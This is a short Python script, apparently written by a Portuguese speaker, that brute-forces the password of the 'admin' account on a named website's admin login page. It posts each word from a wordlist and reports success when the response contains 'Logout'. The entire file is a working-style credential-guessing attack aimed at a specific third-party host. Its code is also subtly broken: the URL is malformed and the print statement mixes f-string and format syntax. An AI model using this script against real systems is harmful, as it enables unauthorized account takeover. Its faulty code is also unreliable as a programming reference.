import requests

with open ("wordlist.txt", "r") as file:
    wordlist = file.read().splitlines()

    for word in wordlist:
        data = {"user" : "admin", "password" : word}
        response = requests.post("https:advanced.baconcn.com/admin/index.php ", data=data)
        if "Logout" in response.text:
            print(f"Senha {} correta encontrada!".format(word))